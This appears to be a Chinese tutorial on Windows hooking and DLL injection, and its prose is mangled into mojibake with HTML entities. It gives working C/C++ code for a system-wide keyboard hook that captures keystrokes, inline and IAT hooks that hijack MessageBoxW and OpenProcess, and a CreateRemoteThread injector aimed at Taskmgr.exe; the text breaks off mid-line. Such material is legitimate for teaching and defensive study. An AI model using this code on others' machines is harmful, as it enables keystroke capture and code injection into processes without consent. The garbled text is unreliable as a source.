Hookæ˜¯æ€ä¹ˆåˆ†ç±»çš„ï¼Ÿï¼Ÿ\nåœ¨windowsç³»ç»Ÿä¸‹ï¼Œæœ‰ä¸¤ç±»Hookï¼š\n2.1 windowsæ¶ˆæ¯Hookã€‚windowsæä¾›çš„èƒ½å¤Ÿè®©ç¨‹åºå‘˜æˆªè·åˆ°æ‰€æœ‰çª—å£ç¨‹åºæ¶ˆæ¯çš„æœºåˆ¶ã€‚\n æ¶ˆæ¯Hookä¹Ÿæ˜¯æˆ‘ä»¬çš„ä¸€ç§Dllæ³¨å…¥æ‰‹æ®µã€‚\n2.2 è‡ªå®šä¹‰Hook éå¸¸æ™®éçš„Hookæ–¹å¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬é€šå¸¸æ„ä¹‰æ‰€è¯´çš„Hookã€‚\n 2.2.1 ä¿®æ”¹ç¨‹åºçš„ä»£ç ï¼Œä½¿å¾—å…¶èƒ½å¤Ÿæ‰§è¡Œåˆ°Hookè€…æä¾›çš„â€œå–„æ„ä»£ç â€ä¸­ã€‚ inline-Hook\n 2.2.2 ä¿®æ”¹å­˜å‚¨å‡½æ•°åœ°å€çš„å˜é‡ï¼Œå½“ç¨‹åºä»å˜é‡ä¸­è·å–å‡½æ•°åœ°å€å¹¶è°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨åˆ°Hookè€…æä¾›çš„â€œå–„æ„ä»£ç â€äº†ã€‚\n IAT-Hook\n IDT-Hook\n SYSENTR-Hook\n3 windowsæ¶ˆæ¯é’©å­çš„å®ç°çš„åŸç†ä»¥åŠä»£ç \n3.1 windowsæ¶ˆæ¯é’©å­çš„å®ç°çš„åŸç†\nSetWindowsHookExè¿™ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°çš„åŠŸèƒ½æ˜¯æˆªè· 1 ç³»ç»Ÿä¸­æ‰€æœ‰çš„çª—å£ç¨‹åºçš„æ¶ˆæ¯æˆ–è€… 2 æŸä¸€ä¸ªçº¿ç¨‹çš„çª—å£æ¶ˆæ¯ã€‚\næˆªè·åˆ°äº†æ¶ˆæ¯ï¼Œå¿…ç„¶æ˜¯éœ€è¦æ‰§è¡Œè‡ªå·±çš„ä»£ç ï¼Œè‡ªå·±çš„ä»£ç éœ€è¦æ”¾ç½®åœ¨ä¸€ä¸ªdllä¸­ï¼Œç„¶åæ¶ˆæ¯é’©å­è®¾ç½®æˆåŠŸä¹‹åï¼Œä¼šå°†dllæ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œä»è€Œä½¿å¾—è‡ªå·±çš„å›è°ƒå‡½æ•°èƒ½å¤Ÿåœ¨å¯¹æ–¹çš„è¿›ç¨‹ä¸­æ‰§è¡Œã€‚\né¢å¤–çš„çŸ¥è¯†ç‚¹ï¼šçª—å£ç¨‹åºçš„æ¶ˆæ¯æ˜¯è¢«æŸä¸€ä¸ªçº¿ç¨‹è·å–åˆ°çš„ï¼Œå“ªä¸€ä¸ªçº¿ç¨‹åˆ›å»ºäº†çª—å£ï¼Œå“ªä¸€ä¸ªçº¿ç¨‹å°±èƒ½å¤Ÿè·å¾—æ­¤çª—å£çš„æ¶ˆæ¯ã€‚æ­¤çº¿ç¨‹åœ¨åˆ›å»ºå®Œçª—å£ä¹‹åï¼Œå°±å˜æˆäº†GUIçº¿ç¨‹ã€‚\nHHOOK SetWindowsHookExA(\n int       idHook,   &#x2F;&#x2F; è¦æˆªè·çš„æ˜¯å“ªç§ç±»å‹çš„æ¶ˆæ¯\n  HOOKPROC  lpfn,     &#x2F;&#x2F;æˆªè·åˆ°æ¶ˆæ¯ä¹‹åï¼Œè°ƒç”¨çš„å›è°ƒå‡½æ•°\n  HINSTANCE hmod,     &#x2F;&#x2F;å›è°ƒå‡½æ•°æ‰€åœ¨çš„æ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—éœ€è¦æ˜¯ä¸€ä¸ªdllã€‚\n  DWORD     dwThreadId  &#x2F;&#x2F;å¡«0  æˆªè·ç³»ç»Ÿä¸­æ‰€æœ‰çš„çª—å£çš„æ¶ˆæ¯  å¡«çº¿ç¨‹ID  é‚£å°±ä»…æˆªè·æ­¤çº¿ç¨‹çš„çª—å£æ¶ˆæ¯\n);\n\n&#x2F;&#x2F;å½“é’©å­ä½¿ç”¨å®Œæ¯•ä¹‹åï¼Œå¸è½½é’©å­\nBOOL WINAPI UnhookWindowsHookEx(\n    _In_ HHOOK hhk      &#x2F;&#x2F;å¡«å……è¿”å›çš„å¥æŸ„\n    );\n\nåœ¨é’©å­çš„æ¶ˆæ¯æ‹¦æˆªå‡½æ•°çš„æœ€åï¼Œåº”è¯¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå› ä¸ºç¨‹åºå¯èƒ½ä¼šæœ‰å¤šä¸ªé’©å­ï¼Œæ–°æ·»åŠ çš„åœ¨æœ€ä¸Šé¢ï¼Œä¸ºäº†ä¸å½±å“å…¶ä»–é’©å­çš„åŠŸèƒ½ï¼Œéœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\nWINUSERAPI\nLRESULT\nWINAPI\nCallNextHookEx(\n    _In_opt_ HHOOK hhk,    &#x2F;&#x2F;é’©å­çš„å¥æŸ„\n    _In_ int nCode,\n    _In_ WPARAM wParam,\n    _In_ LPARAM lParam);\n\næ¶ˆæ¯é’©å­çš„ä»£ç \n#define _countof(a) sizeof(a)&#x2F;sizeof(a[0])\nHHOOK g_Hook &#x3D; 0;\n&#x2F;&#x2F;æ‹¦æˆªæ¶ˆæ¯çš„å›è°ƒå‡½æ•°\nLRESULT CALLBACK KeyboardProc(\n    int code,           &#x2F;&#x2F; æ¶ˆæ¯ç±»å‹\n    WPARAM wParam,      &#x2F;&#x2F; è™šæ‹Ÿç \n    LPARAM lParam) &#123;    &#x2F;&#x2F; æŒ‰é”®ä¿¡æ¯\n    &#x2F;&#x2F; åˆ¤æ–­æ˜¯å¦wParamä¸lParaméƒ½æœ‰é”®ç›˜æ¶ˆæ¯ï¼Œæ˜¯çš„è¯åˆ™æ‰§è¡Œæ‰“å°æ“ä½œ\n    if (code &#x3D;&#x3D; HC_ACTION) &#123;\n        &#x2F;&#x2F; å°†256ä¸ªè™šæ‹Ÿé”®çš„çŠ¶æ€æ‹·è´åˆ°æŒ‡å®šçš„ç¼“å†²åŒºä¸­ï¼Œå¦‚æœæˆåŠŸåˆ™ç»§ç»­\n        BYTE KeyState[256] &#x3D; &#123; 0 &#125;;\n        if (GetKeyboardState(KeyState)) &#123;\n            &#x2F;&#x2F; å¾—åˆ°ç¬¬16â€“23ä½ï¼Œé”®ç›˜è™šæ‹Ÿç \n            LONG  KeyInfo &#x3D; lParam;\n            UINT  keyCode &#x3D; (KeyInfo &gt;&gt; 16) &amp; 0x00ff;\n            WCHAR wKeyCode &#x3D; 0;\n            ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, 0);\n            &#x2F;&#x2F; å°†å…¶æ‰“å°å‡ºæ¥\n            WCHAR szInfo[512] &#x3D; &#123; 0 &#125;;\n            swprintf_s(szInfo, _countof(szInfo), L&quot;Hook_%c&quot;, (char)wKeyCode);\n            OutputDebugString(szInfo);\n            return 0;\n        &#125;\n    &#125;\n    return CallNextHookEx(g_Hook, code, wParam, lParam);\n&#125;\n&#x2F;&#x2F;å¼€å¯Hookçš„å‡½æ•°\nvoid OnHook()\n&#123;\n    HMODULE hModule &#x3D;  GetModuleHandle(L&quot;MessageHookdll.dll&quot;);\n    g_Hook &#x3D; SetWindowsHookEx(\n        WH_KEYBOARD,\n        KeyboardProc,\n        hModule,\n        NULL\n    );\n&#125;\n&#x2F;&#x2F;å…³é—­Hookçš„å‡½æ•°\nvoid UnHook()\n&#123;\n    if (g_Hook!&#x3D;0)\n    &#123;\n        UnhookWindowsHookEx(g_Hook);\n        g_Hook &#x3D; 0;\n    &#125;\n&#125;\n\næ¶ˆæ¯é’©å­ä½¿ç”¨äº†è°ƒè¯•å‡½æ•° OutputDebugString(szInfo);è¾“å‡ºæŒ‰é”®ç ï¼Œä½†æˆ‘ä»¬çœ‹ä¸åˆ°å¯¹æ–¹ç¨‹åºçš„è°ƒè¯•ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ä¸‹å›¾ç¨‹åºæŸ¥çœ‹\n\n\nè‡ªå®šä¹‰é’©å­ï¼š\nè‡ªå®šä¹‰é’©å­ä¸¤å¤§ç±»ï¼šå†…è”é’©å­ ä¿®æ”¹å­˜å‚¨å‡½æ•°åœ°å€å˜é‡çš„é’©å­\n4.1 ä»€ä¹ˆæ˜¯å†…è”é’©å­ inline-Hook\nä»»ä½•ä½ç½®ï¼Œéƒ½å¯ä»¥ä¿®æ”¹ä¸ºjmpï¼Œä½¿å…¶æ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°æˆ‘ä»¬è‡ªå·±çš„ä»£ç å»æ‰§è¡Œï¼š\n1 è¢«ä¿®æ”¹çš„æŒ‡ä»¤ï¼Œæ˜¯å¦æ˜¯æœ‰ç”¨çš„ï¼Œå¦‚æœæ˜¯æœ‰ç”¨çš„ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦åœ¨ä½ è‡ªå·±çš„ä»£ç ä¸­ï¼Œå°†æœ‰ç”¨çš„æŒ‡ä»¤å†™ä¸€éï¼Œä½¿å…¶åœ¨ä½ ä»£ç ä¸­èƒ½å¤Ÿæ‰§è¡Œã€‚\n2 jmpæŒ‡ä»¤ä¸€èˆ¬æ˜¯5ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰å–çš„æŒ‡ä»¤æœ€å¥½ä¹Ÿæ˜¯5ä¸ªå­—èŠ‚ï¼Œå¦‚æœä¸æ˜¯5ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆä¼šå‘ç”ŸæŒ‡ä»¤æˆªæ–­ï¼Œè·³è½¬å›æ¥çš„æ—¶å€™ï¼Œå°±éœ€è¦è€ƒè™‘è·³è½¬åˆ°å®Œæ•´çš„æŒ‡ä»¤åå»æ‰§è¡Œç¨‹åºæœ¬èº«çš„ä»£ç ã€‚\n3 jmpæŒ‡ä»¤OPCODEçš„æ“ä½œæ•°æ€ä¹ˆæ±‚å¾—ï¼Œä¹Ÿæ˜¯Hookçš„å…³é”®çŸ¥è¯†ç‚¹\njmpæŒ‡ä»¤OPCODEçš„æ“ä½œæ•° &#x3D; è¦è·³è½¬çš„ç›®æ ‡åœ°å€-hookç‚¹æ‰€åœ¨çš„åœ°å€-5\nDLLæµ‹è¯•ä»£ç InLine_HOOK.hæ–‡ä»¶\n#pragma once\nvoid OnHook();\nvoid OffHook();\nvoid InitHook();\n\n.cppæ–‡ä»¶\n#include &quot;HookMessageBox.h&quot;\n#include &lt;Windows.h&gt;\n\nunsigned char g_NewCode[5] &#x3D; &#123; 0xE9 &#125;;\nunsigned char g_OldCode[5] &#x3D; &#123;  &#125;;\nvoid OffHook();\nvoid OnHook();\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType)\n&#123;\n\tlpText &#x3D; (wchar_t*)L&quot;ä½ è¢«æ‰“åŠ«äº†^_^&quot;;\n\tDWORD dwReturnCode &#x3D; 0;\n\tOffHook();\n\tdwReturnCode &#x3D; MessageBoxW(hWnd, lpText, lpCaption, uType);\n\tOnHook();\n\treturn dwReturnCode;\n&#125;\nvoid InitHook()\n&#123;\n\t&#x2F;&#x2F;1 å¾—åˆ°Hookçš„æŒ‡ä»¤\n\tDWORD dwOffset &#x3D; (DWORD)MyMessageBoxW - (DWORD)MessageBoxW - 5;\n\t&#x2F;&#x2F;*(PDWORD)(code + 1) &#x3D; dwOffset;\n\tmemcpy(g_NewCode + 1, &amp;dwOffset, 4);\n\t&#x2F;&#x2F;2 å¾—åˆ°åŸå§‹çš„æŒ‡ä»¤\n\tmemcpy(g_OldCode, MessageBoxW, 5);\n&#125;\n\nvoid OnHook()\n&#123;\n\n\t&#x2F;&#x2F;1 ä¿®æ”¹Hookç‚¹çš„å±æ€§\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(MessageBoxW, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F;2 ä¿®æ”¹æŒ‡ä»¤\n\tmemcpy(MessageBoxW, g_NewCode,5);\n\t&#x2F;&#x2F;3 å±æ€§è¿˜åŸ\n\tVirtualProtect(MessageBoxW, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\n\nvoid OffHook()\n&#123;\n\t&#x2F;&#x2F;1 æ”¹å±æ€§\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(MessageBoxW, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F;2 æ”¹æŒ‡ä»¤\n\tmemcpy(MessageBoxW, g_OldCode, 5);\n\t&#x2F;&#x2F;3 å±æ€§è¿˜åŸ\n\tVirtualProtect(MessageBoxW, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\ndllmain.cppæ–‡ä»¶\n#include &quot;framework.h&quot;\n#include &quot;HookMessageBox.h&quot;\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tInitHook();\n\t\tOnHook();\n\t&#125;\n\t\tbreak;\n    case DLL_THREAD_ATTACH:\n\t\tbreak;\n    case DLL_THREAD_DETACH:\n\t\tbreak;\n    case DLL_PROCESS_DETACH:\n\t&#123;\n\t\tOffHook();\n\t&#125;\n        break;\n    &#125;\n    return TRUE;\n&#125;\n\nIAT_HOOK.hæ–‡ä»¶\n#pragma once\n#include &lt;windows.h&gt;\nvoid IatHook(char* lpModuleAddress, DWORD FunAddress, const char* szTarFunName, const char* szTarDllName &#x3D; NULL);\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType);\n\n.cppæ–‡ä»¶\n#include &quot;IATHookMessageBoxW.h&quot;\n#include &lt;Windows.h&gt;\ntypedef int (WINAPI* MESSAGEBOX)(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType);\nMESSAGEBOX g_OldMessageBox;\n\nvoid IatHook(char* lpModuleAddress, DWORD FunAddress, const char* szTarFunName, const char* szTarDllName)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å…¥è¡¨ç»“æ„\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpModuleAddress;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpModuleAddress);\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å…¥è¡¨çš„æ•°æ®ç›®å½•ç»“æ„\n\tPIMAGE_DATA_DIRECTORY dwImportDir &#x3D; &amp;pNt-&gt;OptionalHeader.DataDirectory[1];\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å…¥è¡¨ç»“æ„\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTable &#x3D;\n\t\t(PIMAGE_IMPORT_DESCRIPTOR)(lpModuleAddress + dwImportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;2 è§£æå¯¼å…¥è¡¨\n\t\t&#x2F;&#x2F;2 å¼€å§‹è§£æ\n\twhile (pImportTable-&gt;Name !&#x3D; 0)\n\t&#123;\n\n\t\tchar* pDllName &#x3D; (pImportTable-&gt;Name + lpModuleAddress);\n\t\tchar* pbuf &#x3D; new char[strlen(pDllName) + 1]&#123; 0 &#125;;\n\t\tstrcpy_s(pbuf, strlen(pDllName) + 1, pDllName);\n\t\t_strlwr_s(pbuf, strlen(pDllName) + 1);\n\t\tif (szTarDllName !&#x3D; NULL)\n\t\t&#123;\n\t\t\tif (strcmp(szTarDllName, pbuf) &#x3D;&#x3D; 0)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;å¾—åˆ°ç›®æ ‡å‡½æ•°çš„åœ°å€\n\t\t\t\tHMODULE hModule &#x3D; GetModuleHandleA(pDllName);\n\t\t\t\tDWORD dwTarAddress &#x3D; (DWORD)GetProcAddress(hModule, szTarFunName);\n\t\t\t\t&#x2F;&#x2F;åœ¨IATä¸­å¯»æ‰¾è¿™ä¸ªå‡½æ•°åœ°å€\n\t\t\t\tPIMAGE_THUNK_DATA32 pIat &#x3D; (PIMAGE_THUNK_DATA32)\n\t\t\t\t\t(pImportTable-&gt;FirstThunk + lpModuleAddress);\n\t\t\t\twhile (pIat-&gt;u1.Function!&#x3D;0)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;æ‰¾åˆ°äº†ä¹‹åå¼€å§‹Hookï¼ŒIATä¹Ÿæ˜¯ä¸å¯å†™çš„\n\t\t\t\t\tif (pIat-&gt;u1.Function &#x3D;&#x3D; dwTarAddress)\n\t\t\t\t\t&#123;\n\n\t\t\t\t\t\t&#x2F;&#x2F;ä¿å­˜äº†ä¸€ä¸‹MessageBoxçš„åœ°å€ã€‚\n\t\t\t\t\t\tg_OldMessageBox &#x3D; (MESSAGEBOX)pIat-&gt;u1.Function;\n\t\t\t\t\t\t&#x2F;&#x2F;1 ä¿®æ”¹Hookç‚¹çš„å±æ€§\n\t\t\t\t\t\tDWORD dwOldProtect &#x3D; 0;\n\t\t\t\t\t\tVirtualProtect(&amp;pIat-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t\t\t\t\t\tpIat-&gt;u1.Function &#x3D; FunAddress;\n\t\t\t\t\t\tVirtualProtect(&amp;pIat-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect);\n\t\t\t\t\t&#125;\n\t\t\t\t\tpIat++;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t\tpImportTable++;\n\t&#125;\n&#125;\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType)\n&#123;\n\tlpText &#x3D; (wchar_t*)L&quot;ä½ è¢«æ‰“åŠ«äº†^_^&quot;;\n\tDWORD dwReturnCode &#x3D; 0;\n\tdwReturnCode &#x3D; g_OldMessageBox(hWnd, lpText, lpCaption, uType);\n\treturn dwReturnCode;\n&#125;\n\ndllmain.cpp\n#include &quot;framework.h&quot;\n#include &quot;IATHookMessageBoxW.h&quot;\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tLPVOID ExeBase &#x3D; GetModuleHandle(0);\n\t\tIatHook((char*)ExeBase,(DWORD)MyMessageBoxW,&quot;MessageBoxW&quot;,&quot;user32.dll&quot;);\n\t&#125;\n\n\t\t\tbreak;\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    &#125;\n    return TRUE;\n&#125;\n\nProcess_HookDLLæ–‡ä»¶&#x2F;&#x2F; dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚\n#include &quot;stdafx.h&quot;\n#include &lt;TlHelp32.h&gt;\n\n&#x2F;&#x2F; é€šè¿‡è¿›ç¨‹åè·å–è¿›ç¨‹id\nDWORD GetPid(const wchar_t* filePath);\n&#x2F;&#x2F; è·å–helloworldç¨‹åºpid\nDWORD g_dwPid &#x3D; GetPid(L&quot;FileCleaner2.0.exe&quot;);\n&#x2F;&#x2F; æ—§çš„å‡½æ•°åœ°å€\nDWORD* g_pOldAddr &#x3D; (DWORD*)OpenProcess;\n&#x2F;&#x2F; æ—§çš„å‡½æ•°æ•°æ®\nchar g_oldCode[5] &#x3D; &#123;&#125;;\n\nvoid OnHook();\nvoid UnHook();\n\n&#x2F;&#x2F; ç¼–å†™è‡ªå·±çš„OpenProcesså‡½æ•°\nHANDLE WINAPI MyOpenProcess(\n\t_In_ DWORD dwDesiredAccess,\n\t_In_ BOOL bInheritHandle,\n\t_In_ DWORD dwProcessId\n)\n&#123;\n\t&#x2F;&#x2F; æ¯”å¯¹pidæ˜¯å¦ä¸helloworldç¨‹åºç›¸ç­‰\n\tif (dwProcessId &#x3D;&#x3D; g_dwPid)\n\t&#123;\n\t\tMessageBox(0,L&quot;è¿›ç¨‹è¢«ä¿æŠ¤&quot;,L&quot;æç¤º&quot;,0);\n\t&#125;\n\telse\n\t&#123;\n\t\t&#x2F;&#x2F; å¦‚æœä¸ç›¸ç­‰ï¼Œé‡æ–°è°ƒç”¨åŸæ¥çš„OpenProcesså‡½æ•°\n\t\t&#x2F;&#x2F; å…ˆæ¢å¤åŸæ¥å‡½æ•°æ•°æ®\n\t\tUnHook();\n\t\tHANDLE hProcess &#x3D; OpenProcess(\n\t\t\tdwDesiredAccess, bInheritHandle, dwProcessId);\n\t\t&#x2F;&#x2F; è°ƒç”¨å®Œä¹‹åé‡æ–°hook\n\t\tOnHook();\n\t\treturn hProcess;\n\t&#125;\n&#125;\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n\tDWORD  ul_reason_for_call,\n\tLPVOID lpReserved\n)\n&#123;\n\tswitch (ul_reason_for_call)\n\t&#123;\n\tcase DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tOnHook();\n\t\tMessageBox(NULL, L&quot;æ³¨å…¥æˆåŠŸ&quot;, L&quot;æç¤º&quot;, NULL);\n\t\tbreak;\n\t&#125;\n\tcase DLL_THREAD_ATTACH:\n\tcase DLL_THREAD_DETACH:\n\tcase DLL_PROCESS_DETACH:\n\t\tbreak;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid OnHook()\n&#123;\n\t&#x2F;&#x2F; 1.å…ˆä¿å­˜OpenProcessåŸæ¥çš„æ•°æ®\n\tmemcpy(g_oldCode, g_pOldAddr, 5);\n\n\t&#x2F;&#x2F; 2.è®¾ç½®æ–°çš„æŒ‡ä»¤,jmp\n\tchar opcode[5] &#x3D; &#123; 0xE9 &#125;;\n\t&#x2F;&#x2F; 2.1 è®¡ç®—åç§»å¹¶èµ‹å€¼\n\t*(DWORD*)(opcode + 1) &#x3D; (DWORD)MyOpenProcess - (DWORD)OpenProcess - 5;\n\n\t&#x2F;&#x2F; 3.ä¿®æ”¹ä¿æŠ¤å±æ€§\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(g_pOldAddr, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\n\t&#x2F;&#x2F; 4.å†™å…¥è·³è½¬æŒ‡ä»¤\n\tmemcpy(g_pOldAddr, opcode, 5);\n\t\n\t&#x2F;&#x2F; 5.è¿˜åŸä¿æŠ¤å±æ€§\n\tVirtualProtect(g_pOldAddr, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\nvoid UnHook()\n&#123;\n\t&#x2F;&#x2F; 1.ä¿®æ”¹ä¿æŠ¤å±æ€§\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(g_pOldAddr, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F; 2.è¿˜åŸæ—§çš„æŒ‡ä»¤æ•°æ®\n\tmemcpy(g_pOldAddr, g_oldCode, 5);\n\t&#x2F;&#x2F; 3.è¿˜åŸä¿æŠ¤å±æ€§\n\tVirtualProtect(g_pOldAddr, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\nDWORD GetPid(const wchar_t* szExeName)\n&#123;\n\t&#x2F;&#x2F; åˆ›å»ºè¿›ç¨‹å¿«ç…§\n\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t&#x2F;&#x2F; åˆ¤æ–­å¿«ç…§å¥æŸ„æ˜¯å¦æœ‰æ•ˆ\n\tif (hSnapshot !&#x3D; INVALID_HANDLE_VALUE)\n\t&#123;\n\t\t&#x2F;&#x2F;å®šä¹‰è¿›ç¨‹ç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ å¿…é¡»èµ‹å€¼ä¸ºç»“æ„ä½“å¤§å°\n\t\tPROCESSENTRY32 stcPe32 &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\t\t&#x2F;&#x2F;æŸ¥æ‰¾ç¬¬ä¸€ä¸ªè¿›ç¨‹\n\t\tProcess32First(hSnapshot, &amp;stcPe32);\n\t\tdo\n\t\t&#123;\t&#x2F;&#x2F; å¦‚æœè¿›ç¨‹åä¸€è‡´ï¼Œè¿”å›è¿›ç¨‹id\n\t\t\tif (!wcscmp(stcPe32.szExeFile, szExeName))\n\t\t\t\treturn stcPe32.th32ProcessID;\n\n\t\t\t&#x2F;&#x2F;æŸ¥æ‰¾ä¸‹ä¸€ä¸ªè¿›ç¨‹\n\t\t&#125; while (Process32Next(hSnapshot, &amp;stcPe32));\n\t\t&#x2F;&#x2F;å…³é—­å¿«ç…§å¥æŸ„\n\t\tCloseHandle(hSnapshot);\n\t&#125;\n\treturn -1;\n&#125;\n\næµ‹è¯•æ–‡ä»¶&#x2F;&#x2F; æ³¨å…¥.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚\n&#x2F;&#x2F;\n\n#include &quot;pch.h&quot;\n#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;TlHelp32.h&gt;\n\n#define DLLPATH &quot;C:\\\\Users\\\\hugan\\\\Documents\\\\15PB\\\\ä»£ç æ³¨å…¥ä¸æ‹¦æˆª\\\\ODæ³¨å…¥\\\\x64\\\\Debug\\\\InlineHook.dll&quot;\n&#x2F;&#x2F;#define DLLPATH &quot;D:\\\\041\\\\test\\\\Debug\\\\IatHook.dll&quot;\n\n&#x2F;&#x2F; é€šè¿‡è¿›ç¨‹åè·å–è¿›ç¨‹id\nDWORD GetPid(const wchar_t* szExeName);\n\nint main()\n&#123;\n\t&#x2F;&#x2F; 1.è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„\n\t&#x2F;&#x2F; 1.1 è·å–æŒ‡å®šè¿›ç¨‹id\n\tDWORD dwPid &#x3D; GetPid(L&quot;Taskmgr.exe&quot;);\n\t&#x2F;&#x2F; 1.2 æ‰“å¼€è¿›ç¨‹ï¼ˆæ³¨å…¥ODéœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œvsï¼Œå¦åˆ™æ— æ³•æ‰“å¼€è¿›ç¨‹)\n\tHANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);\n\t&#x2F;&#x2F; 1.3 æ£€æµ‹è¿›ç¨‹å¥æŸ„\n\tif (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE)\n\t\treturn -1;\n\n\t&#x2F;&#x2F; 2.1 è®¡ç®—dllè·¯å¾„é•¿åº¦\n\tDWORD dwSize &#x3D; strlen(DLLPATH) + 1;\n\t&#x2F;&#x2F; 2.åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€æ®µç©ºé—´\n\tLPVOID lpAddr &#x3D; VirtualAllocEx(\n\t\thProcess, 0, dwSize, MEM_COMMIT, PAGE_READWRITE);\n\n\t&#x2F;&#x2F; 3.1 å†™å…¥ä¹‹å‰å¯ä»¥å…ˆæµ‹è¯•åŠ è½½ä¸€ä¸‹çœ‹èƒ½å¦æˆåŠŸ\n\t&#x2F;*HMODULE hMod &#x3D; LoadLibraryA(DLLPATH);\n\tMessageBoxW(0, 0, 0, 0);*&#x2F;\n\n\t&#x2F;&#x2F; 3.å°†dllåå­—å†™å…¥åˆ°ç›®æ ‡è¿›ç¨‹ç©ºé—´ä¸­\n\t&#x2F;&#x2F; æ³¨æ„ï¼šè·¯å¾„ä¸å‡½æ•°å¿…é¡»åŒ¹é…ï¼ŒAç‰ˆå‡½æ•°é…Aç‰ˆå­—ç¬¦ä¸²ã€‚å¦‚æœç”¨Wç‰ˆï¼Œå†™å…¥çš„æ—¶å€™ï¼Œé•¿åº¦è¦ä¹˜ä»¥2ï¼Œ\n\t\t&#x2F;&#x2F;\tå› ä¸ºwcslenæ±‚å‡ºçš„æ˜¯å­—ç¬¦ä¸²é•¿åº¦è€Œä¸æ˜¯å­—èŠ‚æ•°\n\tif (!WriteProcessMemory(hProcess, lpAddr, DLLPATH, dwSize, NULL))\n\t\treturn -1;\n\n\t&#x2F;&#x2F; 4.åˆ›å»ºè¿œç¨‹çº¿ç¨‹\n\tHANDLE hRtThread &#x3D; CreateRemoteThread(hProcess, NULL, 0,\n\t\t(LPTHREAD_START_ROUTINE)LoadLibraryA,lpAddr, NULL, NULL);\n\n\t&#x2F;&#x2F; 5.ç­‰å¾…æ‰§è¡Œç»“æœ\n\tWaitForSingleObject(hRtThread, -1);\n\t\n\t&#x2F;&#x2F; 6.è·å–çº¿ç¨‹é€€å‡ºç \n\tDWORD dwExitCode &#x3D; 